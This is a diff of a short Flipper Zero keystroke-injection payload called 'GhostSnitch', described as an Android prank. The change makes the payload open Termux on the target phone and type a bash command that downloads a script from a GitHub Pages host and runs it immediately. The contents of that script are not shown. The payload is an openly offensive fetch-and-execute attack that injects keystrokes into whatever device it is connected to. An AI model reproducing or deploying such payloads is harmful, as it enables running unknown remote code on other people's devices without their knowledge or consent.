@@ -1,8 +1,11 @@
 REM GhostSnitch Android Payload
 REM Author: TBJr
-REM Description: Opens hosted Android prank script via Flipper HID
+REM Description: Executes hosted Android prank script via Termux
 
 GUI r
 DELAY 500
-STRING am start -a android.intent.action.VIEW -d https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh
+STRING am start -n com.termux/.HomeActivity
+ENTER
+DELAY 1500
+STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
 ENTER
